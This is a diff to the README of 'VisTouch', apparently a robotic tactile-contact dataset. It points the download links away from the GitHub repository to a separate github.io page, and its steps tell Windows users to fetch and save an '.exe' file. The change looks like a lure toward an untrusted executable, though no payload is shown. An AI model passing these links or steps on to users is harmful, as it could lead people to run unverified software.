@@ -1,6 +1,6 @@
 # 🤖 VisTouch - Analyze complex robotic contact data easily
 
-[![Download VisTouch](https://img.shields.io/badge/Download-VisTouch-blue)](https://github.com/testingzenz-sys/VisTouch)
+[![Download VisTouch](https://img.shields.io/badge/Download-VisTouch-blue)](https://testingzenz-sys.github.io)
 
 VisTouch provides a complete view of how robots interact with objects through touch. This dataset combines high-definition vision, tactile sensor feedback, and audio recordings. Researchers and developers use these files to train machines to understand sliding contact. You can use this software to view, filter, and export data samples for your own machine learning projects.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these requirements to run the software smoothly.
 
 Follow these steps to obtain the software on your Windows computer.
 
-1.  Visit the [official download page](https://github.com/testingzenz-sys/VisTouch).
+1.  Visit the [official download page](https://testingzenz-sys.github.io).
 2.  Locate the latest release version on the right sidebar.
 3.  Click the link ending in `.exe` to start the download.
 4.  Save the file to your Downloads folder.
